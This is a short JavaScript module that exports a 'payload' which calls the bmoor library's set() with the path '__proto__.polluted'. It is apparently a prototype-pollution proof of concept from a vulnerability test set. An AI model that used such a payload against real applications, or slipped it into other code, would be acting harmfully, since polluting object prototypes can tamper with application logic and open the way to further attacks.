function getPayload() {
    return {
        setPrototypePollution: function() {
            const bmoor = require("bmoor");
            bmoor.set({}, "__proto__.polluted", "yes");
        }
    };
}

module.exports = { getPayload };